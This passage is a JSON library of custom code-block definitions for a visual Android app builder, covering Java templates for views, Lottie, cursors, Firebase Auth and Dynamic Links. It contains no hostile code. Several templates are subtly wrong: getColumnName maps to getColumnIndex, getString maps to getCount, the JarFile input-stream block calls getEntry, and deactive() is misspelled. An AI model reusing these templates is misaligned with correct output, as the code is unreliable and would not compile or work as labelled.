[{"code":"%s.setAnimation(%s);","name":"Lottie setAnimation","palette":"16","type":" ","spec":"%m.LottieAnimationView setAnimation %s"},{"code":"%s.setRepeatCount(%s);","name":"setRepeatCountLottie","palette":"16","type":" ","spec":"%m.LottieAnimationView setRepeatCount %d"},{"code":"%s.setRepeatMode(com.airbnb.lottie.LottieDrawable.%s);","name":"setRepeatModeLottie","palette":"16","type":" ","spec":"%m.LottieAnimationView setRepeatMode %s.inputOnly"},{"code":"%s.playAnimation();","name":"playAnimationLottie","palette":"16","type":" ","spec":"%m.LottieAnimationView playAnimation"},{"code":"%s","name":"getVariableView","typeName":"View","palette":"9","type":"v","spec":"getVariableView %s.inputOnly"},{"code":"%s","name":"getVariableImageView","typeName":"ImageView","palette":"9","type":"v","spec":"getVariableImageView %s.inputOnly"},{"code":"%s","name":"getVariableTextView","typeName":"TextView","palette":"9","type":"v","spec":"getVariableTextView %s.inputOnly"},{"code":"%s","name":"getVariableEditText","typeName":"EditText","palette":"9","type":"v","spec":"getVariableEditText %s.inputOnly"},{"code":"%s","name":"getVariableListView","typeName":"ListView","palette":"9","type":"v","spec":"getVariableListview %s.inputOnly"},{"code":"%s.setLayoutParams(new LinearLayout.LayoutParams(%s, %s));","name":"setLayoutParamsView","palette":"9","type":" ","spec":"%m.view setLayoutParams Width %d Height %d"},{"code":"%s.addView(%s);","name":"addNewView","palette":"9","type":" ","spec":"%m.view addView %m.view"},{"code":"%s.setBackground(androidx.core.content.ContextCompat.getDrawable(getApplicationContext(), R.drawable.%s));","name":"setBackgroundDrawable","palette":"9","type":" ","spec":"%m.view setBackgroundDrawable %s.inputOnly"},{"code":"%s.performClick();","name":"performClick","palette":"9","type":" ","spec":"%m.view performClick"},{"code":"final %s %s \u003d getLayoutInflater().inflate(R.layout.%s, null);","name":"createViewInflater","palette":"9","type":" ","spec":"Create View %s.inputOnly Var %s.inputOnly From Layout %s.inputOnly"},{"code":"final %s %s \u003d new %s(%s);","name":"createViewProgrammatically","palette":"9","type":" ","spec":"Create View %s.inputOnly Var %s.inputOnly New View %s.inputOnly Context %s.inputOnly"},{"code":"%s \u003d new %s(%s.this);","name":"createPublicViewProgrammatically","palette":"9","type":" ","spec":"%s.inputOnly New View %s.inputOnly On %m.activity"},{"code":"%s.removeAllViews();","name":"removeAllViews","palette":"9","type":" ","spec":"%m.view removeAllViews"},{"code":"%s \u003d findViewById(R.id.%s);","name":"findViewById","palette":"9","type":" ","spec":"%m.view findViewById %s.inputOnly"},{"code":"%s \u003d %s.findViewById(R.id.%s);","name":"findViewOnView","palette":"9","type":" ","spec":"%m.view On %m.view findViewById %s.inputOnly"},{"code":"%s.setCompoundDrawablesWithIntrinsicBounds(%s, %s, %s, %s);","name":"setCompoundDrawable","palette":"9","type":" ","spec":"%m.view setIcon Left %s.inputOnly Top %s.inputOnly Right %s.inputOnly Bottom %s.inputOnly"},{"code":"AJCode.setBackgroundGradient(%s, %s, %s);","name":"setBackgroundGradientView","palette":"9","type":" ","spec":"%m.view setBackgroundGradient First %m.color Second %m.color"},{"code":"AJCode.setRoundedRipple(%s, %s, %s, %s, %s, %s, %s, %s, %s);","name":"setRoundedRippleView","palette":"9","type":" ","spec":"%m.view setRoundCorner LT %d RT %d RB %d LB %d setColor %m.color setStroke Size %d strokeColor %m.color setRippleColor %m.color"},{"code":"getSupportActionBar().setHomeAsUpIndicator(R.drawable.%s);","name":"setIconToolbar","palette":"9","type":" ","spec":"setIconToolbar %m.resource_bg"},{"code":"%s.setElevation((float)%s);","name":"setElevation","palette":"9","type":" ","spec":"%m.view setElevation %d"},{"code":"%s.setError(%s);","name":"setErrorText","palette":"9","type":" ","spec":"%m.edittext setError %s"},{"code":"com.google.android.material.snackbar.Snackbar.make(%s, %s, com.google.android.material.snackbar.Snackbar.LENGTH_LONG).show();","name":"showSnackBarOnly","palette":"9","type":" ","spec":"showSnackBar On %m.view Message %s"},{"code":"com.google.android.material.snackbar.Snackbar.make(%s, %s, com.google.android.material.snackbar.Snackbar.LENGTH_INDEFINITE)\n.setAction(%s, new OnClickListener() {\n@Override\npublic void onClick(View v) {\n%s\n}\n}).show();","name":"showSnackBarWithAction","palette":"9","type":"c","spec":"showSnackBar On %m.view Message %s Action %s"},{"code":"%s.setSingleLine(%s);","name":"setSingleLineText","palette":"9","type":" ","spec":"%m.edittext setSingleLine %b"},{"code":"%s.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);","name":"setTextTypePassword","palette":"9","type":" ","spec":"%m.edittext setTextTypePassword"},{"code":"%s.setOrientation(LinearLayout.%s);","name":"setOrientationView","palette":"9","type":" ","spec":"%m.view setOrientation %s.inputOnly"},{"code":"%s.setTextSize((float)%s);","name":"setTextSize","palette":"9","type":" ","spec":"%m.textview setTextSize %d"},{"code":"View %1$s \u003d  ((LayoutInflater)getApplicationContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE)).inflate(R.layout.%2$s, null, false);\n%3$s.addFooterView(%1$s);","name":"AddFooterListToListView","palette":"9","type":" ","spec":"ViewFooter %s.inputOnly addCustomLayout%s.inputOnly toListView%m.listview"},{"code":"SpannableString %1$s \u003d  new SpannableString(%2$s);","name":"SpannableString","palette":"9","type":" ","spec":"SpannableString %s.inputOnly String %s"},{"code":"android.text.style.ForegroundColorSpan %1$s \u003d new android.text.style.ForegroundColorSpan(%2$s);","name":"ForegroundColorSpan","palette":"9","type":" ","spec":"ForegroundColorSpan %s.inputOnly color %m.color"},{"code":"android.text.style.BackgroundColorSpan %1$s \u003d new android.text.style.BackgroundColorSpan(%2$s);","name":"BackgroundColorSpan","palette":"9","type":" ","spec":"BackgroundColorSpan %s.inputOnly color %m.color"},{"code":"%1$s.setSpan(%4$s, %2$s, %3$s, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);","name":"SpanSetTo","palette":"9","type":" ","spec":"SpannableString %s.inputOnly indexStart %d end %d typeSpan %s.inputOnly"},{"code":"%1$s.setText(%2$s);","name":"SpanSetToTextView","palette":"9","type":" ","spec":"%m.textview setSpan %s.inputOnly"},{"code":"getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS, WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS); getWindow().setStatusBarColor(Color.TRANSPARENT);","name":"TransparentStatusBar","palette":"9","type":" ","spec":"TransparentStatusBar"},{"code":"","name":"XMLeditor","palette":"9","type":" ","spec":"ID %s Type %s Name %s Value %s"},{"code":"if(android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.HONEYCOMB) {\n\ngetWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);\n\n}","name":"BlockScreenShot","palette":"9","type":" ","spec":"BlockScreenShot"},{"code":"%1$s.setTransformationMethod(android.text.method.HideReturnsTransformationMethod.getInstance());","name":"EditTextPasswordShow","palette":"9","type":" ","spec":"%m.textview Show Password"},{"code":"%1$s.setTransformationMethod(android.text.method.PasswordTransformationMethod.getInstance());","name":"EditTextPasswordHide","palette":"9","type":" ","spec":"%m.textview Hide Password"},{"code":"android.text.style.URLSpan %1$s \u003d new android.text.style.URLSpan(%2$s);","name":"URL_Span","palette":"9","type":" ","spec":"URLSpan %s.inputOnly setURL %s"},{"code":"%1$s.setMovementMethod(android.text.method.LinkMovementMethod.getInstance());","name":"setMovementMethod","palette":"9","type":" ","spec":"%m.TextView setMovementMethod"},{"code":"%1$s.setProgressDrawable(getDrawable(R.drawable.%2$s));","name":"ProgressBarDrawable","palette":"9","type":" ","spec":"%m.progressbar setDrawable %s.inputOnly"},{"code":"final VideoView %1$s \u003d (VideoView) _v.findViewById(R.id.%1$s);","name":"VideoViewOnBindView","palette":"9","type":" ","spec":"VideoViewID %m.VideoView"},{"code":"%1$s.setOnTouchListener(new View.OnTouchListener() {        \n    @Override\n    public boolean onTouch(View view, MotionEvent event) {\n    switch (event.getActionMasked()) {\n      case MotionEvent.ACTION_DOWN:\n        dX \u003d view.getX() - event.getRawX();\n        dY \u003d view.getY() - event.getRawY();\n        lastAction \u003d MotionEvent.ACTION_DOWN;\n        break;\n\n      case MotionEvent.ACTION_MOVE:\n        view.setY(event.getRawY() + dY);\n        view.setX(event.getRawX() + dX);\n        lastAction \u003d MotionEvent.ACTION_MOVE;\n        break;\n\n      case MotionEvent.ACTION_UP:\n        if (lastAction \u003d\u003d MotionEvent.ACTION_DOWN)\n          %2$s\n        break;\n\n      default:\n        return false;\n    }\n    return true;\n    }\n});","name":"MovableView","palette":"9","type":"c","spec":"%m.view setMovableView and caseActionUp"},{"code":"%1$s","name":"View","typeName":"View","palette":"9","type":"v","spec":"%s.inputOnly View"},{"code":"%s.setOnClickListener(new View.OnClickListener(){\n@Override\npublic void onClick(View _view){\n%s\n}\n});","name":"setOnClickListener","palette":"14","type":"c","spec":"When %m.view On Clicked"},{"code":"%s.setOnLongClickListener(new View.OnLongClickListener(){\n@Override\npublic boolean onLongClick(View _view){\n%s\nreturn false;\n}\n});","name":"setOnLongClickListener","palette":"14","type":"c","spec":"When %m.view On Long Clicked"},{"code":"%s.setOnScrollChangeListener(new View.OnScrollChangeListener(){\n@Override\npublic void onScrollChange(View _view, int _x, int _y, int _oldX, int _oldY){\n%s\n}\n});","name":"setOnScrollChanged","palette":"14","type":"c","spec":"When %m.view On Scroll Changed"},{"code":"%s","name":"getVarAnimationDrawable","typeName":"AnimationDrawable","palette":"17","type":"v","spec":"getVarAnimationDrawable %s.inputOnly"},{"code":"android.graphics.drawable.AnimationDrawable %s \u003d (android.graphics.drawable.AnimationDrawable) %s.getBackground();","name":"createNewAnimationDrawable","palette":"17","type":" ","spec":"createNewAnimationDrawable %s.inputOnly From %m.view"},{"code":"%s.setEnterFadeDuration(%s);","name":"setEnterFadeDuration","palette":"17","type":" ","spec":"%m.AnimationDrawable setEnterFadeDuration %d"},{"code":"%s.setExitFadeDuration(%s);","name":"setExitFadeDuration","palette":"17","type":" ","spec":"%m.AnimationDrawable setExitFadeDuration %d"},{"code":"%s.start();","name":"startAnimationDrawable","palette":"17","type":" ","spec":"%m.AnimationDrawable startAnimation"},{"code":"switch(%s){\n%s\n}","name":"switchString","palette":"11","type":"c","spec":"switch %s"},{"code":"switch(%s){\n%s\n}","name":"switchNumber","palette":"11","type":"c","spec":"switch %d"},{"code":"case %s :\n%s\nreturn true;","name":"caseString","palette":"11","type":"c","spec":"case %s"},{"code":"case %s :\n%s\nreturn true;","name":"caseNumber","palette":"11","type":"c","spec":"case %d"},{"code":"default :\n%s","name":"caseDefault","palette":"11","type":"c","spec":"default"},{"code":"try{\n%s\n}catch(Exception e){\n%s\n}","name":"tryCatch","palette":"11","type":"e","spec":"Try","spec2":"Cat"},{"code":"while(%s){\n%s\n}","name":"whileOnly","palette":"11","type":"c","spec":"while %b"},{"code":"for(int %s\u003d%s;%s;%s){\n%s\n}","name":"forLooping","palette":"11","type":"c","spec":"for %s.inputOnly \u003d %d and %b and %s.inputOnly"},{"code":"%s \u003d new PopupMenu(getApplicationContext(), %s);","name":"createNewPopupMenu","palette":"18","type":" ","spec":"%m.PopupMenu Create Popup Menu To %m.view"},{"code":"%s.getMenu().add(%s);","name":"createNewMenuPopupMenu","palette":"18","type":" ","spec":"%m.PopupMenu Create New Menu %s"},{"code":"%s.getMenu().addSubMenu(%s);","name":"createNewSubMenuPopupMenu","palette":"18","type":" ","spec":"%m.PopupMenu Create New SubMenu %s"},{"code":"%s.getMenu().getItem(%s).setIcon(R.drawable.%s);","name":"setIconMenuPopupMenu","palette":"18","type":" ","spec":"%m.PopupMenu Get Menu Position %d Set Icon %m.resource_bg"},{"code":"menuItem.getTitle().toString()","name":"getTitleMenuItem","palette":"18","type":"s","spec":"%m.PopupMenu Get Title Menu"},{"code":"%s.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){\n@Override\npublic boolean onMenuItemClick(MenuItem menuItem){\n%s\nreturn true;\n}\n});","name":"setOnMenuClickListener","palette":"18","type":"c","spec":"%m.PopupMenu setOnMenuItemClickListener"},{"code":"%s.show();","name":"showPopupMenu","palette":"18","type":" ","spec":"%m.PopupMenu show"},{"code":"%s","name":"getVarFile","typeName":"File","palette":"12","type":"v","spec":"getVarFile %s.inputOnly"},{"code":"%s","name":"getVarJarFile","typeName":"JarFile","palette":"12","type":"v","spec":"getVarJarFile %s.inputOnly"},{"code":"%s","name":"getVarZipEntry","typeName":"ZipEntry","palette":"12","type":"v","spec":"getVarZipEntry %s.inputOnly"},{"code":"%s","name":"getVarInputStream","typeName":"InputStream","palette":"12","type":"v","spec":"getVarInputStream %s.inputOnly"},{"code":"File %s \u003d new File(%s);","name":"createNewFile","palette":"12","type":" ","spec":"%m.File Create New File Path %s"},{"code":"%s.getAbsolutePath()","name":"getAbsoluteFilePath","palette":"12","type":"s","spec":"%m.File getAbsoluteFilePath"},{"code":"%s.canExecute()","name":"canExecuteFile","palette":"12","type":"b","spec":"%m.File canExecute"},{"code":"%s.canRead()","name":"canReadFile","palette":"12","type":"b","spec":"%m.File canRead"},{"code":"%s.canWrite()","name":"canWriteFile","palette":"12","type":"b","spec":"%m.File canWrite"},{"code":"%s.getName()","name":"getNameFile","palette":"12","type":"s","spec":"%m.File getName"},{"code":"%s.renameTo(new File(%s));","name":"renameFile","palette":"12","type":"b","spec":"%m.File renameFile %s"},{"code":"java.util.jar.JarFile %s \u003d new java.util.jar.JarFile(new java.io.File(%s));","name":"createNewJarFile","palette":"12","type":" ","spec":"%m.JarFile Create New Jar File Path %s"},{"code":"%s.getEntry(%s);","name":"getEntryJar","typeName":"ZipEntry","palette":"12","type":"v","spec":"%m.JarFile getEntry %s"},{"code":"%s.getEntry(%s);","name":"getInputStreamJar","typeName":"InputStream","palette":"12","type":"v","spec":"%m.JarFile getInputStreamJar To ZipEntry %m.ZipEntry"},{"code":"getApplicationContext().getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null, null, null, null)","name":"getAllMusicFiles","typeName":"ContentResolver","palette":"12","type":"v","spec":"ContentResolver getAllMusicFilesOnStorage"},{"code":"%s","name":"getVarCursor","typeName":"Cursor","palette":"19","type":"v","spec":"getVarCursor %s.inputOnly"},{"code":"final Cursor %s \u003d %s;","name":"createNewCursor","palette":"19","type":" ","spec":"Create Cursor %s.inputOnly From Content Resolver %m.ContentResolver"},{"code":"%s.close();","name":"closeCursor","palette":"19","type":" ","spec":"%m.Cursor Close"},{"code":"%s.deactive();","name":"deactiveCursor","palette":"19","type":" ","spec":"%m.Cursor Deactive"},{"code":"%s.getColumnCount()","name":"getColumnCountCursor","palette":"19","type":"d","spec":"%m.Cursor getColumnCountCursor"},{"code":"%s.getColumnIndex(%s)","name":"getColumnIndexCursor","palette":"19","type":"d","spec":"%m.Cursor getColumnIndex %s"},{"code":"%s.getColumnIndex(%s)","name":"getColumnNameCursor","palette":"19","type":"s","spec":"%m.Cursor getColumnName %d"},{"code":"%s.getCount()","name":"getCountCursor","palette":"19","type":"d","spec":"%m.Cursor getCount"},{"code":"%s.getCount(%s)","name":"getStringCursor","palette":"19","type":"s","spec":"%m.Cursor getString %d"},{"code":"%s.getPosition()","name":"getPositionCursor","palette":"19","type":"d","spec":"%m.Cursor getPosition"},{"code":"%s.moveToFirst()","name":"moveToFirstCursor","palette":"19","type":"b","spec":"%m.Cursor moveToFirst"},{"code":"%s.moveToLast()","name":"moveToLastCursor","palette":"19","type":"b","spec":"%m.Cursor moveToLast"},{"code":"%s.moveToNext()","name":"moveToNextCursor","palette":"19","type":"b","spec":"%m.Cursor moveToNext"},{"code":"%s.moveToPosition(%s)","name":"moveToPositionCursor","palette":"19","type":"b","spec":"%m.Cursor moveToPosition %d"},{"code":"%s.moveToPrevious()","name":"moveToPeviousCursor","palette":"19","type":"b","spec":"%m.Cursor moveToPrevious"},{"code":"%s.requery()","name":"requeryCursor","palette":"19","type":"b","spec":"%m.Cursor requery"},{"code":"%s","name":"getVarActionCodeSettings","typeName":"ActionCodeSettings","palette":"20","type":"v","spec":"getVarActionCodeSettings %s.inputOnly"},{"code":"FirebaseAuth.getInstance().getCurrentUser().getDisplayName()","name":"firebaseAuthGetName","palette":"20","type":"s","spec":"FirebaseAuth getName"},{"code":"FirebaseAuth.getInstance().getCurrentUser().getPhotoUrl().toString()","name":"firebaseAuthGetPhotoUrl","palette":"20","type":"s","spec":"FirebaseAuth getPhotoUrl"},{"code":"((FirebaseUser)FirebaseAuth.getInstance().getCurrentUser()) !\u003d null","name":"firebaseAuthisLoggedIn","palette":"20","type":"b","spec":"FirebaseAuth isLoggedIn"},{"code":"FirebaseAuth.getInstance().getCurrentUser().isEmailVerified()","name":"firebaseAuthisEmailVerified","palette":"20","type":"b","spec":"FirebaseAuth isEmailVerified"},{"code":"ActionCodeSettings %s \u003d ActionCodeSettings.newBuilder()\n.setUrl(%s)\n.setHandleCodeInApp(true)\n.setIOSBundleId(%s)\n.setAndroidPackageName(%s, true, \"19\")\n.build();","name":"firebaseAuthActionCodeSettings","palette":"20","type":" ","spec":"ActionCodeSettings %s.inputOnly Create New Builder With Url %s And Package IOS %s Package Android %s "},{"code":"FirebaseAuth.getInstance().getCurrentUser().updateProfile(new UserProfileChangeRequest.Builder().setDisplayName(%2$s).setPhotoUri(Uri.parse(%3$s)).build()).addOnCompleteListener(%1$s_updateProfileListener);","name":"firebaseAuthUpdateProfile","palette":"20","type":" ","spec":"%m.firebaseauth updateProfile Name %s Photo Url %s"},{"code":"FirebaseAuth.getInstance().getCurrentUser().updateEmail(%2$s).addOnCompleteListener(%1$s_updateEmailListener);","name":"firebaseAuthUpdateEmail","palette":"20","type":" ","spec":"%m.firebaseauth updateEmail %s"},{"code":"FirebaseAuth.getInstance().getCurrentUser().updatePassword(%2$s).addOnCompleteListener(%1$s_updatePasswordListener);","name":"firebaseAuthUpdatePassword","palette":"20","type":" ","spec":"%m.firebaseauth updatePassword %s"},{"code":"FirebaseAuth.getInstance().getCurrentUser().sendEmailVerification().addOnCompleteListener(%s_emailVerificationSentListener);","name":"firebaseAuthSendEmailVerification","palette":"20","type":" ","spec":"%m.firebaseauth sendEmailVerification"},{"code":"FirebaseAuth.getInstance().getCurrentUser().delete()\n.addOnCompleteListener(%s_deleteUserListener);","name":"firebaseAuthDeleteUser","palette":"20","type":" ","spec":"%m.firebaseauth deleteUser"},{"code":"PhoneAuthProvider.getInstance().verifyPhoneNumber(%2$s, 60, TimeUnit.SECONDS, %3$s.this, %1$s);","name":"FirebasePhoneAuth startPhoneNumberVerification","palette":"20","type":" ","spec":"%m.FirebasePhoneAuth startPhoneNumberVerification %s On %m.activity"},{"code":"FirebaseAuth.getInstance().signInWithCredential(PhoneAuthProvider.getCredential(%2$s, %3$s)).addOnCompleteListener(%1$s_phoneAuthListener);","name":"FirebasePhoneAuth verifyPhoneNumberWithCode","palette":"20","type":" ","spec":"%m.firebaseauth verifyPhoneNumberWithCode Verification %s Code %s"},{"code":"FirebaseAuth.getInstance().signInWithCredential(%2$s).addOnCompleteListener(%1$s_phoneAuthListener);","name":"FirebasePhoneAuth signInWithPhoneAuthCredential","palette":"20","type":" ","spec":"%m.firebaseauth signInWithPhoneAuthCredential %m.PhoneAuthCredential"},{"code":"PhoneAuthProvider.getInstance().verifyPhoneNumber(%2$s, 60, TimeUnit.SECONDS, %3$s.this, %1$s, %1$s_resendToken);","name":"FirebasePhoneAuth resendVerificationCode","palette":"20","type":" ","spec":"%m.FirebasePhoneAuth resendVerificationCode %s On %m.activity"},{"code":"%1$s_resendToken \u003d %2$s;","name":"FirebasePhoneAuth setRecentToken","palette":"20","type":" ","spec":"%m.FirebasePhoneAuth setRecentToken %m.FirebasePhoneAuth"},{"code":"%s.setAdapter(new %s(%s));","name":"GridViewsetAdapter","palette":"21","type":" ","spec":"GridView %m.GridView setAdapter %s.inputOnly %m.listMap"},{"code":"%s.setColumnWidth(%s);","name":"GridView setColumnWidth","palette":"21","type":" ","spec":"GridView %m.GridView setColumnWidth %d"},{"code":"%s.setHorizontalSpacing(%s);","name":"GridView setHorizontalSpacing","palette":"21","type":" ","spec":"GridView %m.GridView setHorizontalSpacing %d"},{"code":"%s.setNumColumns(%s);","name":"GridView setNumColumns","palette":"21","type":" ","spec":"GridView %m.GridView setNumColumns %d"},{"code":"%s.setStretchMode(GridView.%s);","name":"GridView setStretchMode","palette":"21","type":" ","spec":"GridView %m.GridView setStretchMode %s.inputOnly"},{"code":"%s.setVerticalSpacing(%s);","name":"GridView setVerticalSpacing","palette":"21","type":" ","spec":"GridView %m.GridView setVerticalSpacing %d"},{"code":"%s.setFastScrollEnabled(%s);","name":"GridView setFastScrollEnabled","palette":"21","type":" ","spec":"GridView %m.GridView setFastScrollEnabled %b"},{"code":"((BaseAdapter)%1$s.getAdapter()).notifyDataSetChanged();","name":"RefreshData","palette":"21","type":" ","spec":"%m.GridView refresh"},{"code":"%1$s.setAdapter(new %1$SAdapter(%2$s));","name":"NewGridViewsetAdapter","palette":"21","type":" ","spec":"GridView %m.GridView setAdapter %m.listMap"},{"code":"%s \u003d new ProgressDialog(%s.this);","name":"ProgressDialog create","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog Create %m.activity"},{"code":"%s.setIndeterminate((int)%s);","name":"ProgressDialog setIndeterminate","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog setIndeterminate %b"},{"code":"%s.setMax((int)%s);","name":"ProgressDialog setMax","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog setMax %d"},{"code":"%s.setMessage(%s);","name":"ProgressDialog setMessage","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog setMessage %s"},{"code":"%s.setProgress((int)%s);","name":"ProgressDialog setProgress","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog setProgress %d"},{"code":"%s.setProgressStyle(ProgressDialog.%s);","name":"ProgressDialog setProgressStyle","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog setProgressStyle %s.inputOnly"},{"code":"%s.getMax()","name":"ProgressDialog getMax","palette":"22","type":"d","spec":"ProgressDialog %m.ProgressDialog getMax"},{"code":"%s.getProgress()","name":"ProgressDialog getProgress","palette":"22","type":"d","spec":"ProgressDialog %m.ProgressDialog getProgress"},{"code":"%s.incrementProgressBy((int)%s);","name":"ProgressDialog incrementProgressBy","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog incrementProgressBy %d"},{"code":"%s.isIndeterminate()","name":"ProgressDialog isIndeterminate","palette":"22","type":"b","spec":"ProgressDialog %m.ProgressDialog isIndeterminate"},{"code":"%s.isShowing()","name":"ProgressDialog isShowing","palette":"22","type":"b","spec":"ProgressDialog %m.ProgressDialog isShowing"},{"code":"%s.show();","name":"ProgressDialog show","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog show"},{"code":"%s.setCancelable(%s);","name":"ProgressDialog setCancelable","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog setCancelable %b"},{"code":"%s.dismiss();","name":"ProgressDialog dismiss","palette":"22","type":" ","spec":"ProgressDialog %m.ProgressDialog dismiss"},{"code":"%s","name":"blockTest","palette":"22","type":"h","spec":"blockTest"},{"code":"%3$s \u003d (ArrayList\u003cString\u003e) Arrays.asList(%1$s.split(%2$s));","name":"stringArrayToArrayList","palette":"13","type":" ","spec":"%s Split Text Regex %s To %m.listStr"},{"code":"%s \u003d\u003d null","name":"\u003d\u003d 2","palette":"13","type":"b","spec":"%s \u003d\u003d null"},{"code":"%s !\u003d null","name":"!\u003d 2","palette":"13","type":"b","spec":"%s !\u003d null"},{"code":"%s \u003d new LinkedTreeMap\u003c\u003e();","name":"LinkedTreeMap createNew","palette":"23","type":" ","spec":"%m.LinkedTreeMap create new map"},{"code":"%s.put(%s, %s);","name":"LinkedTreeMap putValue","palette":"23","type":" ","spec":"%m.LinkedTreeMap put key %s value %s"},{"code":"%s.get(%s).toString()","name":"LinkedTreeMap getValue","palette":"23","type":"s","spec":"%m.LinkedTreeMap get key %s"},{"code":"%s.containsKey(%s)","name":"LinkedTreeMap containsKey","palette":"23","type":"b","spec":"%m.LinkedTreeMap contains key %s"},{"code":"%s.remove(%s);","name":"LinkedTreeMap removeKey","palette":"23","type":" ","spec":"%m.LinkedTreeMap remove key %s"},{"code":"%s.size()","name":"LinkedTreeMap size","palette":"23","type":"d","spec":"%m.LinkedTreeMap size"},{"code":"%s.clear();","name":"LinkedTreeMap clear","palette":"23","type":" ","spec":"%m.LinkedTreeMap clear"},{"code":"%s.isEmpty()","name":"LinkedTreeMap isEmpty","palette":"23","type":"b","spec":"%m.LinkedTreeMap is empty"},{"code":"%2$s \u003d (ArrayList\u003cString\u003e) %1$s.keySet();","name":"LinkedTreeMap getAllKeys","palette":"23","type":" ","spec":"%m.LinkedTreeMap get all keys to %m.listStr"},{"code":"%s.setCancelable(%s);","name":"AlertDialog setCancelable","palette":"24","type":" ","spec":"%m.dialog setCancelable %b"},{"code":"%s.setIcon(R.drawable.%s);","name":"AlertDialog setIcon","palette":"24","type":" ","spec":"%m.dialog setIcon %m.resource_bg"},{"code":"%s.setView(%s);","name":"AlertDialog setView","palette":"24","type":" ","spec":"%m.dialog setView %m.view"},{"code":"_dialog.dismiss();","name":"AlertDialog dismiss","palette":"24","type":" ","spec":"%m.dialog dismiss"},{"code":"%s \u003d FirebaseDynamicLinks.getInstance().createDynamicLink().setDomainUriPrefix(%s).setAndroidParameters(new DynamicLink.AndroidParameters.Builder().setMinimumVersion(%s).build()).setLink(Uri.parse(%s)).buildDynamicLink();","name":"FirebaseDynamicLink createDynamicLink","palette":"25","type":" ","spec":"%m.FirebaseDynamicLink createLink Domain %s MinVer %d Link %s"},{"code":"%s.getUri().toString()","name":"FirebaseDynamicLink getLink","palette":"25","type":"s","spec":"%m.FirebaseDynamicLink getLink"},{"code":"FirebaseDynamicLinks.getInstance().getDynamicLink(%2$s.this.getIntent()).addOnSuccessListener(%2$s.this, %1$s_onSuccessLink).addOnFailureListener(%2$s.this, %1$s_onFailureLink);","name":"FirebaseDynamicLink getDynamicLink","palette":"25","type":" ","spec":"%m.FirebaseDynamicLink getDynamicLink On %m.activity"},{"code":"","name":"FirebaseDynamicLink setDataHost","palette":"25","type":" ","spec":"setDataHost Url %s Scheme %s"},{"code":"// manuall link\n        String manuallink  \u003d \"https://indosw.com/jcoderz.php?id\u003d\"+ %1$s +\n                \"\u0026apn\u003d\"+ getPackageName()+\n                \"\u0026st\u003d\"+ %2$s +\n                \"\u0026sd\u003d\"+ %3$s +\n                \"\u0026si\u003d\"+ \"https://firebasestorage.googleapis.com/v0/b/exis62.appspot.com/o/newlogoswrevo.png?alt\u003dmedia\u0026token\u003d19556173-e4ae-487f-b3dc-ef439548c36c\";","name":"GenerateManualDynamicLink","palette":"25","type":" ","spec":"GenerateManualDynamicLink keyID %s Title %s Description %s"},{"code":"%1$s \u003d FirebaseDynamicLinks.getInstance().createDynamicLink()\n                .setLink(Uri.parse(%3$s))\n                .setDomainUriPrefix(%2$s)\n                // Open links with this id.swrevo.app on Android\n                .setAndroidParameters(new DynamicLink.AndroidParameters.Builder().build())\n                // Open links with com.example.ios on iOS\n                //.setIosParameters(new DynamicLink.IosParameters.Builder(\"com.example.ios\").build())\n                .buildDynamicLink();","name":"DynamicLinkFromManual","palette":"25","type":" ","spec":"%m.FirebaseDynamicLink HostDomain %s ManualLink %s"},{"code":"manuallink","name":"ManualLink","typeName":"String","palette":"25","type":"v","spec":"ManualLink"},{"code":"Glide.with(getApplicationContext()).load(Uri.parse(\"https://api.qrserver.com/v1/create-qr-code/?data\u003d\".concat(%1$s))).into(%2$s);","name":"LinkToQRBarcode","palette":"25","type":" ","spec":"Convert Link %s toQRBarcode setToImage %m.imageview"},{"code":"Intent intentDynLink \u003d new Intent();\nintentDynLink.setAction(Intent.ACTION_SEND);\nintentDynLink.putExtra(Intent.EXTRA_TEXT,  %1$s);\nintentDynLink.setType(\"text/plain\");\nstartActivity(intentDynLink);","name":"ShareLink","palette":"25","type":" ","spec":"%s Share"},{"code":"%1$s \u003d FirebaseDynamicLinks.getInstance().createDynamicLink()\n        .setLink(Uri.parse(\"https://indosw.com/jcoderz.php?id\u003d\".concat(%4$s)))\n        .setDomainUriPrefix(%2$s)\n        .setAndroidParameters(\n                new DynamicLink.AndroidParameters.Builder(getPackageName())\n                        .setMinimumVersion(%3$s)\n                        .build())\n        .setSocialMetaTagParameters(\n                new DynamicLink.SocialMetaTagParameters.Builder()\n                        .setTitle(%5$s)\n                        .setDescription(%6$s)\n                        .build())\n        .buildDynamicLink();","name":"DynamicLinkWithMetaTag","palette":"25","type":" ","spec":"%m.FirebaseDynamicLink UriPerfix %s MinVer %d CatchID %s Title %s Descript %s"},{"code":"Task\u003cShortDynamicLink\u003e shortLinkTask \u003d FirebaseDynamicLinks.getInstance().createDynamicLink()\n        .setLongLink(Uri.parse(%1$s))\n        .buildShortDynamicLink()\n        .addOnCompleteListener(%2$s.this, new OnCompleteListener\u003cShortDynamicLink\u003e() {\n            @Override\n            public void onComplete(@NonNull Task\u003cShortDynamicLink\u003e task) {\n                if (task.isSuccessful()) {\n                    // Short link created\n                    Uri shortLink \u003d task.getResult().getShortLink();\n                    Uri flowchartLink \u003d task.getResult().getPreviewLink();\n                    \n                    final String srtLink \u003d shortLink.toString();\n                    final String flwLink \u003d shortLink.toString();\n                    \n                    %3$s\n                    \n                    \n                    \n                    \n                } else {\n                    // Error\n                    \n                    \n                    %4$s\n                    \n                    \n                }\n            }\n        });","name":"ShortenLink","palette":"25","type":"e","spec":"Shorthen LongURL %s at %m.activity 